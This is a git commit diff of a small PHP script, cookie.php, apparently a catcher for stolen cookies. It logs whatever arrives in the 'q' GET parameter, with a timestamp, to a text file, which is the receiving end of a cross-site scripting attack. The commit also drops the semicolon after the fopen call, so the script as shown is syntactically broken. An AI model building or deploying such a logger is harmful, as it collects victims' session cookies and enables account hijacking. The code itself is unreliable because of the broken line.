24b81c95e53c27e8d639413f6a74f38a98afc668
aotuhacker <2675792591@qq.com>
2016-06-12 09:26:49 +0800

    Update and rename cook.php to cookie.php

--- cookie.php
+++ cookie.php
@@ -2,7 +2,7 @@
 $cookie= $_GET['q'];
 $time=date('y-m-d h:i:s',time());
 $rec=$time."    ".$cookie."\n";
-$myfile=fopen("newfile.txt", "a");
+$myfile=fopen("newfile.txt", "a")
 fwrite($myfile,$rec);
 fclose($myfile);
 ?>
